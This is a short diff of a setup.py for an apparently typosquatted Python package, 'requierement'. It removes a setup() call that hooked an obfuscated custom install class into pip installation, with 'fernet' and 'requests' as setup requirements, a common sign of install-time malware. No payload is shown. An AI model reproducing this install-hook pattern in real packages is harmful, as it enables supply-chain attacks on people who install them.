@@ -18,22 +18,5 @@ class netmAsZeDOHoKoRZbKNFRqYGrmuEwYyCtfVQStjTDWtTegaBXJKnMWOEkUlfsGdXUModvEMlMa
             install.run(self)
 
 
-setup(
-    name="requierement",
-    version=VERSION,
-    author="mYOXqONY",
-    author_email="VtpTS@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': netmAsZeDOHoKoRZbKNFRqYGrmuEwYyCtfVQStjTDWtTegaBXJKnMWOEkUlfsGdXUModvEMlMaxVvSnbcF,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
 
